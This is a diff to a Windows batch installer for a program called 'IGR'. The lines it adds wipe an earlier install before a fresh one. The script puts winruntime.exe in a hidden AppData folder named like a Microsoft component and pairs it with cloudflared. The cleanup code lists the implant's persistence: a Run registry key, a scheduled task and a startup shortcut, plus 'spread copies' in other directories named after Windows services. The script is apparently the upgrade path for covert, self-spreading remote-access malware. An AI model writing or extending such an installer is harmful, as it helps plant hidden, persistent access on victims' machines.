@@ -66,8 +66,34 @@ if exist "%SOURCE_DIR%\cloudflared.exe" (
     echo   cloudflared.exe not found - will be auto-downloaded on first run
 )
 
-REM Create hidden directory in AppData
+REM Detect existing installation and wipe it before fresh install
 set "INSTALL_DIR=%APPDATA%\Microsoft\WindowsRuntime"
+echo.
+echo [2.5/9] Checking for existing IGR installation...
+if exist "%INSTALL_DIR%\winruntime.exe" (
+    echo   Existing IGR installation found - wiping and upgrading...
+    taskkill /f /im winruntime.exe >nul 2>&1
+    taskkill /f /im cloudflared.exe >nul 2>&1
+    timeout /t 2 /nobreak >nul 2>&1
+    echo   Removing old install directory...
+    rd /s /q "%INSTALL_DIR%" >nul 2>&1
+    echo   Removing old registry key...
+    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsRuntime /f >nul 2>&1
+    echo   Removing old scheduled task...
+    schtasks /delete /tn WindowsRuntime /f >nul 2>nul
+    echo   Removing old startup shortcut...
+    del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsRuntime.lnk" >nul 2>&1
+    echo   Removing old spread copies...
+    rd /s /q "%LOCALAPPDATA%\Microsoft\SystemService" >nul 2>&1
+    rd /s /q "%APPDATA%\Microsoft\Windows\RuntimeBroker" >nul 2>&1
+    rd /s /q "%PROGRAMDATA%\WpnService" >nul 2>&1
+    del /f /q "%APPDATA%\.igr_path" >nul 2>&1
+    echo   Old installation wiped.
+) else (
+    echo   No existing IGR installation found.
+)
+
+REM Create hidden directory in AppData
 echo.
 echo [3/9] Creating install directory...
 echo   Path: %INSTALL_DIR%
